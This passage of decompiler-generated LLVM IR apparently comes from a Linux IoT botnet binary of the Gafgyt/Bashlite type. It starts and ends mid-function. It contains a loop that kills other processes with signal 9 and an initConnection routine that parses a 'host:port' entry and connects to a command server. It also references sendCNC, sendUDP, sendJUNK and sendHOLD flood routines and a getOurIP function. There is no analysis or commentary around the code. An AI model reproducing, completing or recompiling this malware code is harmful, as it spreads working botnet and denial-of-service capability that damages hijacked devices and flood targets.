dec_label_pc_8050787.preheader:                   ; preds = %dec_label_pc_80506d5
  br label %dec_label_pc_8050787

dec_label_pc_8050730:                             ; preds = %dec_label_pc_80507c4, %dec_label_pc_8050787
  %v2_8050733 = mul i32 %storemerge, 4
  store i32 %v2_8050733, i32* %edx.global-to-local, align 4
  %v0_8050738 = load i32, i32* @global_var_8065b54.25, align 4
  %v2_805073d = add i32 %v0_8050738, %v2_8050733
  %v1_8050740 = inttoptr i32 %v2_805073d to i32*
  %v2_8050740 = load i32, i32* %v1_8050740, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050742 = icmp eq i32 %v2_8050740, 0
  br i1 %v1_8050742, label %dec_label_pc_8050784, label %dec_label_pc_8050746

dec_label_pc_8050746:                             ; preds = %dec_label_pc_8050730
  %v9_8050733 = and i32 %storemerge, 1073741824
  %v10_8050733 = icmp ne i32 %v9_8050733, 0
  store i1 %v10_8050733, i1* %cf.global-to-local, align 1
  store i32 %v2_8050733, i32* %edx.global-to-local, align 4
  %v2_8050756 = load i32, i32* %v1_8050740, align 4
  store i32 %v2_8050756, i32* @ebx, align 4
  %v0_8050758 = call i32 @__libc_getpid()
  %v0_805075d = load i32, i32* @ebx, align 4
  %v7_805075d = icmp ult i32 %v0_805075d, %v0_8050758
  store i1 %v7_805075d, i1* %cf.global-to-local, align 1
  %v12_805075d = icmp eq i32 %v0_805075d, %v0_8050758
  br i1 %v12_805075d, label %dec_label_pc_8050784, label %dec_label_pc_8050761

dec_label_pc_8050761:                             ; preds = %dec_label_pc_8050746
  store i32 %v2_8050733, i32* %edx.global-to-local, align 4
  %v0_8050769 = load i32, i32* @global_var_8065b54.25, align 4
  %v2_805076e = add i32 %v0_8050769, %v2_8050733
  %v1_8050771 = inttoptr i32 %v2_805076e to i32*
  %v2_8050771 = load i32, i32* %v1_8050771, align 4
  %v0_8050773 = load i32, i32* @esp, align 4
  %v5_8050773 = icmp ult i32 %v0_8050773, 8
  store i1 %v5_8050773, i1* %cf.global-to-local, align 1
  %v2_8050779 = call i32 @kill(i32 %v2_8050771, i32 9)
  %v0_805077e = load i32, i32* @esp, align 4
  %v2_805077e = icmp ugt i32 %v0_805077e, -17
  store i1 %v2_805077e, i1* %cf.global-to-local, align 1
  %v4_8050781 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_8050784

dec_label_pc_8050784:                             ; preds = %dec_label_pc_8050746, %dec_label_pc_8050730, %dec_label_pc_8050761
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8050730 ], [ %stack_var_-28.1, %dec_label_pc_8050746 ], [ %v4_8050781, %dec_label_pc_8050761 ]
  %v4_8050784 = add i32 %storemerge, 1
  br label %dec_label_pc_8050787

dec_label_pc_8050787:                             ; preds = %dec_label_pc_8050787.preheader, %dec_label_pc_8050784
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8050784 ], [ 0, %dec_label_pc_8050787.preheader ]
  %storemerge = phi i32 [ %v4_8050784, %dec_label_pc_8050784 ], [ 0, %dec_label_pc_8050787.preheader ]
  %v0_805079b = load i32, i32* @global_var_805f8c8.23, align 8
  %v0_80507a0 = load i32, i32* @global_var_805f8cc.24, align 4
  store i32 %v0_80507a0, i32* %edx.global-to-local, align 4
  %v10_80507b8 = icmp ne i32 %v0_80507a0, 0
  store i1 %v10_80507b8, i1* %cf.global-to-local, align 1
  br i1 %v10_80507b8, label %dec_label_pc_8050730, label %dec_label_pc_80507c4

dec_label_pc_80507c4:                             ; preds = %dec_label_pc_8050787
  %v10_80507d8 = icmp ult i32 %storemerge, %v0_805079b
  store i1 %v10_80507d8, i1* %cf.global-to-local, align 1
  br i1 %v10_80507d8, label %dec_label_pc_8050730, label %dec_label_pc_80507e4

dec_label_pc_80507e4:                             ; preds = %dec_label_pc_80507c4, %dec_label_pc_80506d5
  %v2_80507e7 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_8050804 = inttoptr i32 %v2_80507e7 to i8*
  store i32 ptrtoint ([12 x i8]* @global_var_805c8cc.890 to i32), i32* @edi, align 4
  %v7_8050816 = call i32 @_strncmp(i8* %v4_8050804, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c8cc.890, i32 0, i32 0), i32 12)
  %v8_8050816 = urem i32 %v7_8050816, 2
  %v9_8050816 = icmp eq i32 %v8_8050816, 0
  %v0_8050818 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050818 = or i1 %v0_8050818, %v9_8050816
  %v3_8050818 = zext i1 %v2_8050818 to i32
  %v4_8050818 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050818 = and i32 %v4_8050818, -256
  %v6_8050818 = or i32 %v3_8050818, %v5_8050818
  %v7_8050818 = xor i32 %v6_8050818, 1
  store i32 %v7_8050818, i32* %edx.global-to-local, align 4
  %v1_8050820 = trunc i32 %v7_8050818 to i8
  %v3_8050820 = zext i1 %v0_8050818 to i8
  %v4_8050820 = sub nsw i8 %v1_8050820, %v3_8050820
  %v15_8050820 = icmp eq i8 %v4_8050820, 0
  %v2_8050824 = sext i8 %v4_8050820 to i32
  store i32 %v2_8050824, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050829 = icmp eq i1 %v15_8050820, false
  br i1 %v1_8050829, label %dec_label_pc_8050835, label %dec_label_pc_805082b

dec_label_pc_805082b:                             ; preds = %dec_label_pc_80507e4
  %v0_805082b = load i32, i32* @esp, align 4
  %v5_805082b = icmp ult i32 %v0_805082b, 12
  store i1 %v5_805082b, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_8050830 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8050835

dec_label_pc_8050835:                             ; preds = %dec_label_pc_805053e, %dec_label_pc_805035a, %dec_label_pc_8050191, %dec_label_pc_805001c, %dec_label_pc_804fc62, %dec_label_pc_804fa25, %dec_label_pc_804f897, %dec_label_pc_8050498, %dec_label_pc_8050334, %dec_label_pc_805016b, %dec_label_pc_804fff6, %dec_label_pc_804fe2a, %dec_label_pc_804fba2, %dec_label_pc_804f9ff, %dec_label_pc_804f871, %dec_label_pc_80507e4, %dec_label_pc_805069e, %dec_label_pc_805051c, %dec_label_pc_80504f9, %dec_label_pc_80504dc, %dec_label_pc_80504bf, %dec_label_pc_80504a2, %dec_label_pc_8050422, %dec_label_pc_805033e, %dec_label_pc_8050296, %dec_label_pc_8050175, %dec_label_pc_80500f5, %dec_label_pc_8050000, %dec_label_pc_804ff1f, %dec_label_pc_804fda5, %dec_label_pc_804f68f, %dec_label_pc_804fc3f, %dec_label_pc_804fc20, %dec_label_pc_804fc03, %dec_label_pc_804fbe6, %dec_label_pc_804fbc9, %dec_label_pc_804fbac, %dec_label_pc_804fb23, %dec_label_pc_804fa09, %dec_label_pc_804f980, %dec_label_pc_804f87b, %dec_label_pc_804f7ad, %dec_label_pc_804f719, %dec_label_pc_804f62a, %dec_label_pc_804f4bc, %dec_label_pc_804f45a, %dec_label_pc_804f73a, %dec_label_pc_805082b
  %v0_805083c = phi i32 [ %v1_805054a, %dec_label_pc_805053e ], [ %v1_8050366, %dec_label_pc_805035a ], [ %v1_805019d, %dec_label_pc_8050191 ], [ %v1_8050028, %dec_label_pc_805001c ], [ %v1_804fc6e, %dec_label_pc_804fc62 ], [ %v1_804fa31, %dec_label_pc_804fa25 ], [ %v1_804f8a3, %dec_label_pc_804f897 ], [ %v2_805048d, %dec_label_pc_8050498 ], [ %v2_8050329, %dec_label_pc_8050334 ], [ %v2_8050160, %dec_label_pc_805016b ], [ %v2_804ffeb, %dec_label_pc_804fff6 ], [ %v2_804fe1f, %dec_label_pc_804fe2a ], [ %v2_804fb97, %dec_label_pc_804fba2 ], [ %v2_804f9f4, %dec_label_pc_804f9ff ], [ %v2_804f866, %dec_label_pc_804f871 ], [ %v2_8050824, %dec_label_pc_80507e4 ], [ %v0_805069e, %dec_label_pc_805069e ], [ %v1_8050528, %dec_label_pc_805051c ], [ %v1_8050505, %dec_label_pc_80504f9 ], [ -1, %dec_label_pc_80504dc ], [ -1, %dec_label_pc_80504bf ], [ -1, %dec_label_pc_80504a2 ], [ %v0_8050422, %dec_label_pc_8050422 ], [ %v1_805034a, %dec_label_pc_805033e ], [ %v0_8050296, %dec_label_pc_8050296 ], [ %v1_8050181, %dec_label_pc_8050175 ], [ %v0_80500f5, %dec_label_pc_80500f5 ], [ %v1_805000c, %dec_label_pc_8050000 ], [ %v0_804ff1f, %dec_label_pc_804ff1f ], [ %v0_804fda5, %dec_label_pc_804fda5 ], [ 0, %dec_label_pc_804f68f ], [ %v1_804fc4b, %dec_label_pc_804fc3f ], [ %v1_804fc2c, %dec_label_pc_804fc20 ], [ -1, %dec_label_pc_804fc03 ], [ -1, %dec_label_pc_804fbe6 ], [ -1, %dec_label_pc_804fbc9 ], [ -1, %dec_label_pc_804fbac ], [ %v0_804fb23, %dec_label_pc_804fb23 ], [ %v1_804fa15, %dec_label_pc_804fa09 ], [ %v0_804f980, %dec_label_pc_804f980 ], [ %v1_804f887, %dec_label_pc_804f87b ], [ %v2_804f7a6, %dec_label_pc_804f7ad ], [ %v0_804f719, %dec_label_pc_804f719 ], [ %v3_804f638, %dec_label_pc_804f62a ], [ %v3_804f4dd, %dec_label_pc_804f4bc ], [ %v3_804f468, %dec_label_pc_804f45a ], [ %v1_804f726, %dec_label_pc_804f73a ], [ %v1_8050830, %dec_label_pc_805082b ]
  %v2_8050838 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050838, i32* @ebx, align 4
  store i32 %v0_804f40b, i32* @esi, align 4
  store i32 %v0_804f40a, i32* @edi, align 4
  ret i32 %v0_805083c

; uselistorder directives
  uselistorder i1 %v0_8050818, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_8050733, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_8050709, { 1, 0 }
  uselistorder i32 %v2_805068b, { 1, 0 }
  uselistorder i32 %v0_8050681, { 1, 0 }
  uselistorder i32 %storemerge39287, { 1, 0 }
  uselistorder i1 %v5_8050623, { 1, 0 }
  uselistorder i32 %v2_80505f7, { 1, 0 }
  uselistorder i32 %v2_80505c2, { 1, 0 }
  uselistorder i32 %v2_80505b1, { 0, 3, 1, 2 }
  uselistorder i32 %v2_805059a, { 1, 0 }
  uselistorder i32 %v2_8050583, { 1, 0 }
  uselistorder i32 %v2_805056c, { 1, 0 }
  uselistorder i32 %v2_8050561, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_8050544, { 1, 0 }
  uselistorder i32 %v2_8050522, { 1, 0 }
  uselistorder i32 %v1_805050d, { 1, 0 }
  uselistorder i32 %v1_8050505, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_80504ff, { 1, 0 }
  uselistorder i32 %v2_80504e2, { 1, 0 }
  uselistorder i1 %v5_80504c7, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i32 %v2_80504c5, { 1, 0 }
  uselistorder i32 %v2_80504a8, { 1, 0 }
  uselistorder i1 %v0_8050481, { 1, 0 }
  uselistorder i32 %v2_805040f, { 1, 0 }
  uselistorder i32 %v0_8050405, { 1, 0 }
  uselistorder i32 %v2_805039f, { 1, 0 }
  uselistorder i32 %v2_8050388, { 1, 0 }
  uselistorder i32 %v2_805037d, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_8050362, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_8050360, { 1, 0 }
  uselistorder i32 %v2_8050344, { 1, 0 }
  uselistorder i1 %v0_805031d, { 1, 0 }
  uselistorder i32 %v2_8050283, { 1, 0 }
  uselistorder i32 %v0_805025e, { 1, 0 }
  uselistorder i32 %v0_8050279, { 1, 0 }
  uselistorder i32 %storemerge43293, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v2_80501d6, { 1, 0 }
  uselistorder i32 %v2_80501bf, { 1, 0 }
  uselistorder i32 %v2_80501b4, { 6, 5, 8, 7, 10, 9, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_8050199, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %v2_8050197, { 1, 0 }
  uselistorder i32 %v2_805017b, { 1, 0 }
  uselistorder i1 %v0_8050154, { 1, 0 }
  uselistorder i32 %v2_80500e2, { 1, 0 }
  uselistorder i32 %v0_80500d8, { 1, 0 }
  uselistorder i32 %v2_805003f, { 3, 0, 2, 1 }
  uselistorder i1 %v5_8050024, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v0_804ffdf, { 1, 0 }
  uselistorder i32 %v2_804ff8e, { 1, 0 }
  uselistorder i32 %v2_804ff68, { 1, 0 }
  uselistorder i1 %v5_804ff4a, { 0, 2, 1 }
  uselistorder i32 %v2_804ff48, { 1, 0 }
  uselistorder i32 %v2_804ff32, { 1, 0 }
  uselistorder i32 %v2_804fede, { 1, 0 }
  uselistorder i32 %v2_804feb8, { 1, 0 }
  uselistorder i1 %v5_804fe9a, { 0, 2, 1 }
  uselistorder i32 %v2_804fe98, { 1, 0 }
  uselistorder i32 %v2_804fe82, { 1, 0 }
  uselistorder i1 %v5_804fe5a, { 1, 0 }
  uselistorder i32 %v2_804fe58, { 1, 0, 2 }
  uselistorder i32 %v2_804fe3a, { 1, 0 }
  uselistorder i32* %v1_804fe3a, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804fe13, { 1, 0 }
  uselistorder i32 %v7_804fe11, { 1, 0 }
  uselistorder i32 %v2_804fd92, { 1, 0 }
  uselistorder i1 %v5_804fd27, { 1, 0 }
  uselistorder i32 %v2_804fcf8, { 1, 0 }
  uselistorder i32 %v1_804fce1, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804fcdb, { 1, 0 }
  uselistorder i32 %v2_804fcc4, { 1, 0 }
  uselistorder i32 %v2_804fcad, { 1, 0 }
  uselistorder i32 %v2_804fc93, { 1, 0 }
  uselistorder i32 %v2_804fc85, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804fc68, { 1, 0 }
  uselistorder i32 %v1_804fc53, { 1, 0 }
  uselistorder i32 %v1_804fc4b, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804fc45, { 1, 0 }
  uselistorder i32 %v1_804fc34, { 1, 0 }
  uselistorder i32 %v1_804fc2c, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804fc26, { 1, 0 }
  uselistorder i32 %v2_804fc09, { 1, 0 }
  uselistorder i32 %v2_804fbec, { 1, 0 }
  uselistorder i1 %v5_804fbd1, { 1, 0, 11, 10, 9, 8, 12, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804fbcf, { 1, 0 }
  uselistorder i32 %v2_804fbb2, { 1, 0 }
  uselistorder i1 %v0_804fb8b, { 1, 0 }
  uselistorder i32 %v2_804fb0a, { 1, 0 }
  uselistorder i32 %v0_804fae5, { 1, 0 }
  uselistorder i32 %v0_804fb00, { 1, 0 }
  uselistorder i32 %v2_804fa70, { 1, 0 }
  uselistorder i32 %v2_804fa56, { 1, 0 }
  uselistorder i32 %v2_804fa48, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_804fa2d, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %v2_804fa2b, { 1, 0 }
  uselistorder i32 %v2_804fa0f, { 1, 0 }
  uselistorder i1 %v0_804f9e8, { 1, 0 }
  uselistorder i32 %v2_804f967, { 1, 0 }
  uselistorder i32 %v0_804f95d, { 1, 0 }
  uselistorder i32 %v2_804f8e2, { 1, 0 }
  uselistorder i32 %v2_804f8c8, { 1, 0 }
  uselistorder i32 %v2_804f8ba, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i1 %v5_804f89f, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804f89d, { 1, 0 }
  uselistorder i32 %v2_804f881, { 1, 0 }
  uselistorder i1 %v0_804f85a, { 1, 0 }
  uselistorder i32 %v0_804f801, { 1, 0 }
  uselistorder i1 %v0_804f7ee, { 1, 0 }
  uselistorder i1 %v0_804f79a, { 1, 0 }
  uselistorder i1 %v0_804f706, { 1, 0 }
  uselistorder i32 %v0_804f6af, { 1, 0 }
  uselistorder i32 %v0_804f68f, { 1, 0, 2 }
  uselistorder i1 %v0_804f67c, { 1, 0 }
  uselistorder i32 %v0_804f62a, { 1, 0 }
  uselistorder i1 %v0_804f60d, { 1, 0 }
  uselistorder i32 %v0_804f5b4, { 1, 0 }
  uselistorder i1 %v0_804f598, { 1, 0 }
  uselistorder i32 %v0_804f53a, { 1, 0 }
  uselistorder i1 %v0_804f51e, { 1, 0 }
  uselistorder i32 %v0_804f4cd, { 1, 0, 2 }
  uselistorder i1 %v0_804f4a9, { 1, 0 }
  uselistorder i32 %v0_804f45a, { 1, 0 }
  uselistorder i1 %v0_804f447, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-460, { 3, 4, 5, 0, 1, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %stack_var_-476, { 3, 4, 8, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 6, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 9, 7, 44, 45, 46, 47, 48 }
  uselistorder i32* %stack_var_-492, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 1, 0, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32* %stack_var_-508, { 2, 3, 4, 1, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %tmp223, { 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %tmp207, { 0, 24, 4, 5, 23, 6, 22, 7, 21, 8, 20, 9, 19, 1, 18, 10, 17, 11, 16, 12, 15, 2, 14, 3, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 5, 4, 1, 2, 3, 6, 7, 8, 17, 16, 18, 19, 20, 21, 9, 10, 12, 11, 13, 14, 15 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 9, 2, 8, 3, 4, 5, 6, 7, 10, 253, 11, 12, 13, 18, 14, 15, 16, 17, 254, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 180, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 255, 47, 48, 49, 54, 50, 51, 52, 53, 256, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 257, 66, 67, 68, 69, 70, 78, 71, 72, 73, 74, 75, 76, 77, 258, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 259, 90, 91, 92, 98, 93, 94, 95, 96, 97, 260, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 261, 110, 111, 112, 113, 114, 115, 123, 116, 117, 118, 119, 120, 121, 122, 262, 124, 125, 126, 127, 128, 263, 129, 130, 131, 134, 133, 132, 264, 135, 136, 137, 138, 139, 140, 141, 142, 143, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 265, 199, 200, 201, 207, 202, 203, 204, 205, 206, 266, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 267, 219, 220, 221, 226, 222, 223, 224, 225, 268, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 245, 238, 239, 240, 241, 242, 243, 244, 246, 251, 247, 248, 249, 250, 252, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 161, 157, 158, 159, 160, 162, 167, 163, 164, 165, 166, 168, 172, 169, 170, 171, 173, 176, 174, 175, 177, 178, 179 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805c7f1.859 to i32), { 15, 0, 14, 1, 13, 2, 12, 3, 11, 4, 10, 5, 9, 6, 8, 7, 16, 17 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 2, 3, 4, 5, 0, 1, 6, 7, 8, 10, 9 }
  uselistorder [3 x i8]* @global_var_805c880.878, { 1, 0 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 1, 6, 7, 8, 0, 2, 3, 9, 10, 11, 4, 5 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8050835, { 47, 15, 16, 0, 17, 18, 19, 20, 21, 7, 22, 1, 23, 8, 24, 2, 25, 9, 26, 3, 27, 10, 28, 11, 29, 4, 31, 32, 33, 34, 35, 36, 12, 37, 5, 38, 13, 39, 6, 40, 14, 41, 46, 42, 30, 43, 44, 45 }
  uselistorder label %dec_label_pc_8050787, { 1, 0 }
  uselistorder label %dec_label_pc_8050784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80506d5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805064e, { 1, 0 }
  uselistorder label %dec_label_pc_8050617, { 1, 0 }
  uselistorder label %dec_label_pc_80505e2, { 1, 0 }
  uselistorder label %dec_label_pc_805055b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805044d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503de, { 1, 0 }
  uselistorder label %dec_label_pc_80502e9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050219, { 1, 0 }
  uselistorder label %dec_label_pc_8050120, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80500a0, { 1, 0 }
  uselistorder label %dec_label_pc_804ffab, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fe73, { 1, 0 }
  uselistorder label %dec_label_pc_804fddf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd55, { 1, 0 }
  uselistorder label %dec_label_pc_804fd18, { 1, 0 }
  uselistorder label %dec_label_pc_804fb57, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fabf, { 1, 0 }
  uselistorder label %dec_label_pc_804f9b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f92d, { 1, 0 }
  uselistorder label %dec_label_pc_804f766, { 1, 0 }
  uselistorder label %dec_label_pc_804f6cf, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_8050846 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_805085a = bitcast i32* %stack_var_-4104 to i8*
  %v4_805085a = call i32 @__GI_memset(i8* %v3_805085a, i32 0, i32 4096)
  %v0_8050862 = load i32, i32* @global_var_805f8c0.20, align 64
  %v1_8050867 = icmp eq i32 %v0_8050862, 0
  br i1 %v1_8050867, label %dec_label_pc_8050886, label %dec_label_pc_805086b

dec_label_pc_805086b:                             ; preds = %entry
  %v1_8050874 = call i32 @__libc_close(i32 %v0_8050862)
  store i32 0, i32* @global_var_805f8c0.20, align 64
  br label %dec_label_pc_8050886

dec_label_pc_8050886:                             ; preds = %entry, %dec_label_pc_805086b
  %v0_8050886 = load i32, i32* @global_var_805f590.891, align 16
  %v1_805088b = icmp eq i32 %v0_8050886, 0
  %v1_805088d = icmp eq i1 %v1_805088b, false
  br i1 %v1_805088d, label %dec_label_pc_805089b, label %dec_label_pc_80508a6

dec_label_pc_805089b:                             ; preds = %dec_label_pc_8050886
  %v1_80508a0 = add i32 %v0_8050886, 1
  br label %dec_label_pc_80508a6

dec_label_pc_80508a6:                             ; preds = %dec_label_pc_8050886, %dec_label_pc_805089b
  %storemerge = phi i32 [ %v1_80508a0, %dec_label_pc_805089b ], [ 0, %dec_label_pc_8050886 ]
  store i32 %storemerge, i32* @global_var_805f590.891, align 16
  %v1_80508ab = mul i32 %storemerge, 4
  %v2_80508ab = add i32 %v1_80508ab, ptrtoint ([15 x i8]** @global_var_805f420.893 to i32)
  %v3_80508ab = inttoptr i32 %v2_80508ab to i32*
  %v4_80508ab = load i32, i32* %v3_80508ab, align 4
  store i32 %v4_80508ab, i32* @eax, align 4
  %v3_80508bd = call i32 @strcpy(i8* %v3_805085a, i32 %v4_80508ab)
  %v0_80508c5 = load i32, i32* @global_var_805f424.894, align 4
  %v3_80508d9 = call i32 @__GI_strchr(i8* %v3_805085a, i32 58)
  %v1_80508e1 = icmp eq i32 %v3_80508d9, 0
  br i1 %v1_80508e1, label %dec_label_pc_8050920, label %dec_label_pc_80508e5

dec_label_pc_80508e5:                             ; preds = %dec_label_pc_80508a6
  %v3_80508f1 = call i32 @__GI_strchr(i8* %v3_805085a, i32 58)
  %v1_80508f9 = add i32 %v3_80508f1, 1
  %v1_80508fe = call i32 @atol(i32 %v1_80508f9)
  %v3_8050915 = call i32 @__GI_strchr(i8* %v3_805085a, i32 58)
  %v4_8050915 = inttoptr i32 %v3_8050915 to i8*
  store i8 0, i8* %v4_8050915, align 1
  br label %dec_label_pc_8050920

dec_label_pc_8050920:                             ; preds = %dec_label_pc_80508a6, %dec_label_pc_80508e5
  %stack_var_-8.0 = phi i32 [ %v0_80508c5, %dec_label_pc_80508a6 ], [ %v1_80508fe, %dec_label_pc_80508e5 ]
  %v3_8050929 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_8050929, i32* @global_var_805f8c0.20, align 64
  %v4_8050949 = call i32 @connectTimeout(i32 %v3_8050929, i32 %v2_8050846, i32 %stack_var_-8.0, i32 30)
  %v1_8050951 = icmp eq i32 %v4_8050949, 0
  %. = zext i1 %v1_8050951 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050920, { 1, 0 }
  uselistorder label %dec_label_pc_80508a6, { 1, 0 }
  uselistorder label %dec_label_pc_8050886, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_8050985 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_8050990 = icmp eq i32 %v5_8050985, -1
  %v1_8050994 = icmp eq i1 %v13_8050990, false
  br i1 %v1_8050994, label %dec_label_pc_80509a5, label %dec_label_pc_8050b68

dec_label_pc_80509a5:                             ; preds = %entry
  %v2_80509a5 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_80509d1 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805c8d8.895 to i32))
  %v2_80509e1 = call i32 @htons(i32 53)
  %v5_80509f9 = call i32 @__libc_connect(i32 %v5_8050985, i32 %v2_80509a5, i32 16)
  %v13_8050a04 = icmp eq i32 %v5_80509f9, -1
  %v1_8050a08 = icmp eq i1 %v13_8050a04, false
  br i1 %v1_8050a08, label %dec_label_pc_8050a19, label %dec_label_pc_8050b68

dec_label_pc_8050a19:                             ; preds = %dec_label_pc_80509a5
  store i32 16, i32* %stack_var_-60, align 4
  %v2_8050a20 = ptrtoint i32* %stack_var_-56 to i32
  %v2_8050a26 = ptrtoint i32* %stack_var_-60 to i32
  %v5_8050a2e = call i32 @__GI_getsockname(i32 %v5_8050985, i32 %v2_8050a20, i32 %v2_8050a26)
  %v13_8050a39 = icmp eq i32 %v5_8050a2e, -1
  %v1_8050a3d = icmp eq i1 %v13_8050a39, false
  br i1 %v1_8050a3d, label %dec_label_pc_8050a4e, label %dec_label_pc_8050b68

dec_label_pc_8050a4e:                             ; preds = %dec_label_pc_8050a19
  %v1_8050a51 = inttoptr i32 %tmp18 to i8*
  store i8* %v1_8050a51, i8** @global_var_8065b48.232, align 8
  %v5_8050a60 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805c8e0.896, i32 0, i32 0), i32 0)
  %v2_8050ac3 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_8050ad551 = call i32 @fdgets(i32 %v2_8050ac3, i32 4096, i32 %v5_8050a60)
  %v1_8050add52 = icmp eq i32 %v5_8050ad551, 0
  %v1_8050adf53 = icmp eq i1 %v1_8050add52, false
  br i1 %v1_8050adf53, label %dec_label_pc_8050a6d, label %dec_label_pc_8050ae1

dec_label_pc_8050a6d:                             ; preds = %dec_label_pc_8050a4e, %dec_label_pc_8050aa7
